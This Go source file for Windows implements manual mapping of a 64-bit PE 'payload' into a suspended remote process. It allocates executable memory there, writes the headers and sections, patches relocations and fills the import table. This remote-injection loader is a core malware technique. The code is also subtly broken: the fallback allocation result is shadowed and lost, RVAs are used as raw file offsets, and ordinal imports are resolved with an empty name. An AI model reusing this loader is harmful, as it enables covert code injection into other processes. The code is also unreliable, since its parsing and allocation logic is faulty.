//go:build windows
// +build windows

package pe

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"errors"
	"syscall"
	"unsafe"
)

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory  = kernel32.NewProc("ReadProcessMemory")
	//procGetThreadContext   = kernel32.NewProc("GetThreadContext")
	//procSetThreadContext   = kernel32.NewProc("SetThreadContext")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	CONTEXT_FULL           = 0x00100000 | 0x00000040 // CONTEXT_FULL for AMD64
)

// ManualMapRemote allocates and maps a 64-bit PE into a suspended remote process.
func ManualMapRemote(procHandle syscall.Handle, payload []byte) (uintptr, error) {
	// Parse PE headers
	f, err := pe.NewFile(bytes.NewReader(payload))
	if err != nil {
		return 0, err
	}
	defer f.Close()
	opt, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return 0, errors.New("only PE32+ supported for remote mapping")
	}

	sizeOfImage := uintptr(opt.SizeOfImage)
	preferredBase := uintptr(opt.ImageBase)
	sizeOfHeaders := uintptr(opt.SizeOfHeaders)

	// 1) Allocate memory in remote process
	raddr, _, _ := procVirtualAllocEx.Call(
		uintptr(procHandle),
		preferredBase,
		sizeOfImage,
		MEM_RESERVE|MEM_COMMIT,
		PAGE_EXECUTE_READWRITE,
	)
	if raddr == 0 {
		// fallback if preferred base is unavailable
		raddr, _, allocErr := procVirtualAllocEx.Call(
			uintptr(procHandle),
			0,
			sizeOfImage,
			MEM_RESERVE|MEM_COMMIT,
			PAGE_EXECUTE_READWRITE,
		)
		if raddr == 0 {
			return 0, allocErr
		}
	}

	// 2) Write headers
	if err := writeRemote(procHandle, raddr, payload[:sizeOfHeaders]); err != nil {
		return 0, err
	}

	// 3) Write sections
	for _, sec := range f.Sections {
		data, err := sec.Data()
		if err != nil {
			return 0, err
		}
		dest := raddr + uintptr(sec.VirtualAddress)
		if err := writeRemote(procHandle, dest, data); err != nil {
			return 0, err
		}
	}

	// 4) Apply relocations if loaded at non-preferred base
	delta := int64(raddr) - int64(preferredBase)
	if delta != 0 {
		relocDir := opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_BASERELOC]
		rData := payload[relocDir.VirtualAddress : relocDir.VirtualAddress+relocDir.Size]
		if err := applyRelocsRemote(procHandle, rData, raddr, delta); err != nil {
			return 0, err
		}
	}

	// 5) Build Import Address Table
	impDir := opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_IMPORT]
	if impDir.Size > 0 {
		if err := buildIATRemote(procHandle, payload, raddr, impDir.VirtualAddress); err != nil {
			return 0, err
		}
	}

	return raddr, nil
}

func writeRemote(procHandle syscall.Handle, addr uintptr, data []byte) error {
	var written uintptr
	r, _, err := procWriteProcessMemory.Call(
		uintptr(procHandle),
		addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		return err
	}
	return nil
}

func applyRelocsRemote(procHandle syscall.Handle, block []byte, base uintptr, delta int64) error {
	// Iterate relocation blocks
	for i := uintptr(0); i < uintptr(len(block)); {
		pageRVA := binary.LittleEndian.Uint32(block[i : i+4])
		sz := binary.LittleEndian.Uint32(block[i+4 : i+8])
		count := (sz - 8) / 2
		entries := block[i+8 : i+8+uintptr(count)*2]

		for j := uint32(0); j < count; j++ {
			ent := binary.LittleEndian.Uint16(entries[j*2 : j*2+2])
			typeIdx := ent >> 12
			offset := ent & 0x0FFF
			if typeIdx == 10 { // IMAGE_REL_BASED_DIR64
				addr := base + uintptr(pageRVA) + uintptr(offset)
				// Read original qword
				var orig uint64
				_, _, _ = procReadProcessMemory.Call(
					uintptr(procHandle),
					addr,
					uintptr(unsafe.Pointer(&orig)),
					8,
					0,
				)
				newVal := orig + uint64(delta)
				buf := make([]byte, 8)
				binary.LittleEndian.PutUint64(buf, newVal)
				if err := writeRemote(procHandle, addr, buf); err != nil {
					return err
				}
			}
		}
		i += uintptr(sz)
	}
	return nil
}

func buildIATRemote(procHandle syscall.Handle, payload []byte, base uintptr, impRVA uint32) error {
	// parse import descriptors
	off := impRVA
	for {
		desc := binary.LittleEndian.Uint64(payload[off : off+8])
		if desc == 0 {
			break
		}
		// read IMAGE_IMPORT_DESCRIPTOR fields
		nameRVA := binary.LittleEndian.Uint32(payload[off+12 : off+16])
		dll := string(payload[nameRVA:])
		hmod, err := syscall.LoadLibrary(dll)
		if err != nil {
			return err
		}

		thunk := binary.LittleEndian.Uint32(payload[off+16 : off+20])
		for thunk != 0 {
			if payload[thunk]&0x80 == 0x80 {
				// ordinal
				addr, _ := syscall.GetProcAddress(hmod, "")
				_ = addr
			} else {
				nameRVA := binary.LittleEndian.Uint32(payload[thunk+2 : thunk+2+4])
				procName := payload[nameRVA:]
				addr, _ := syscall.GetProcAddress(hmod, string(procName))
				buf := make([]byte, unsafe.Sizeof(addr))
				binary.LittleEndian.PutUint64(buf, uint64(addr))
				if err := writeRemote(procHandle, base+uintptr(thunk), buf); err != nil {
					return err
				}
			}
			thunk += 8
		}
		off += 20
	}
	return nil
}
